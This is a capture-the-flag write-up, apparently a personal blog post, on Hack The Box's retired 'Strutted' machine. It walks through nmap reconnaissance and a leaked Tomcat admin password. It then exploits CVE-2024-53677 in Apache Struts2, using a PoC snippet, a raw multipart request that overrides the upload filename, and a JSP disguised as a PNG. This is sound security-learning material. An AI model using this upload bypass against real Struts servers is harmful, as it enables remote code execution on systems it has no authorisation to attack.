This is a retired Medium machine. Doing for practice!
# Init
Starting with `nmap`:
```
┌──(truelyyours㉿kali)-[~/htb/machines/strutted]
└─$ sudo nmap -sC -sV -oA nmap/strutted 10.10.11.59
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 04:18 EDT
Nmap scan report for 10.10.11.59
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://strutted.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
```

So, `ssh` and `http` are running.  The website is some image upload and sharing site. You can download source code too!
![[Pasted image 20250902042657.png]]

Although, after uploading the image, you cannot "Copy Shareable Link"! The README in source code does instruct that you can access the image via `http:localhost:8080/s/{id}` where `id` is some unique identifier

We do get a id and password:
```
┌──(truelyyours㉿kali)-[~/htb/machines/strutted/source_code]
└─$ cat tomcat-users.xml
<?xml version='1.0' encoding='utf-8'?>

<tomcat-users>
    <role rolename="manager-gui"/>
    <role rolename="admin-gui"/>
    <user username="admin" password="skqKY6360z!Y" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

Looking at the source code, the MVC is (Apache) `Struts2` with version `6.3.0.1`.

As we can upload file, googling CVE for this version, there is [CVE-2024-53677](https://www.cve.org/CVERecord?id=CVE-2024-53677) which allows arbitrary path traversal and RCE. [POC](https://github.com/EQSTLab/CVE-2024-53677.git)

I tried the exploit in the above posts, but it does not work directly. The working of the exploit is also not straight forward. So, I look deeper into what causes the vulnerability and how can we craft our exploit. This post explains quite well: https://help.tanium.com/bundle/CVE-2024-31497/page/VERT/CVE-2024-53677/Understanding_Apache_Struts.htm.

We can have a look at the EQSTLab's exploit script. 
```python
def exploit(self) -> None:
        files = {
            'Upload': ("exploit_file.jsp", self.file_content, 'text/plain'),
            'top.UploadFileName': (None, self.path),
        }

        try:
            response = requests.post(self.url, files=files)
            print("Status Code:", response.status_code)
            print("Response Text:", response.text)
            if response.status_code == 200:
                print("File uploaded successfully.")
            else:
                print("Failed to upload file.")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")
```

It upload "two" files within same request but with different "name".

So, Struts has a series of Interceptor classes that run by default, including one called the `FileUploadInterceptor`. Struts has this concept of the object graph navigation library (OGNL), which has a stack. If there are two objects on the stack, and it allows referencing some property, say `name`, and that will work down the stack looking for the first object that has that property and return that.
If a POST request triggers the `FileUploadInterceptor`, you can have other POST parameters that reference parts of that object by the OGNL stack. In practice, that looks like:
```
POST /upload.action HTTP/1.1
Host: strutted.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------257100227792270914038585987
Content-Length: 518
Origin: http://strutted.htb
DNT: 1
Connection: keep-alive
Referer: http://strutted.htb/upload.action
Cookie: JSESSIONID=B49FBC232ACDD342D2ABC2C6B7C0342D
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------257100227792270914038585987
Content-Disposition: form-data; name="upload"; filename="Screenshot_20250902_042406.png"
Content-Type: image/png

PNG

IHDR-uijhlajkdhfaljfadf af;fda
-----------------------------257100227792270914038585987
Content-Disposition: form-data; name="top.UploadFileName"

different.txt

helloworld
-----------------------------257100227792270914038585987--
```

The first form data parameter will be processed into an object by the `FileUploadInterceptor`. Then the second parameter is processed, setting the `UploadFileName` (Which an internal variable that Interceptor uses) for the top of the stack (the first parameter) to this new value. This trick allows for bypassing other rules put in place about where a file can be written, including directory traversals. This means the "filename" i.e. where file is written can be modifier. So we can modify it in such a way that it can be accessed by us via browser!
NOTE: One important thing to consider which I found after reading about custom payload, the first file upload needs to have `name=Upload` with an Upper case `U`. Otherwise this exploit does not work.
![[Pasted image 20250905175120.png]]

This portal only allows image upload. Upload any other file format fails. However, any image file with valid magic header can be uploaded even though the rest of the file is corrupted. So we can sort of embed the script inside the "PNG" file keeping the header same as PNG and providing path i.e. writing the file to a path which we can access/read.

However, we cannot access the file directly at `/uploads/[date]/[filename]`. As per the code, it actually provides us with a sharable link at endpoint `/s`.  But that link simply tries to render the file as an image (PNG in our case). We want the browser to process the file.
![[Pasted image 20250905181824.png]]

As this is java application, we store our file as `temp.jsp`.  (I had my "No Script" extension enabled so by default the `.jsp` file was not being rendered and it took some time to figure it out. Don't make the same mistake!). But as in the above mentioned path it is processed as image, so I try upload in parent folder and so on an eventually I can "read" the file i.e. render/process it on browser as a `jsp` file!


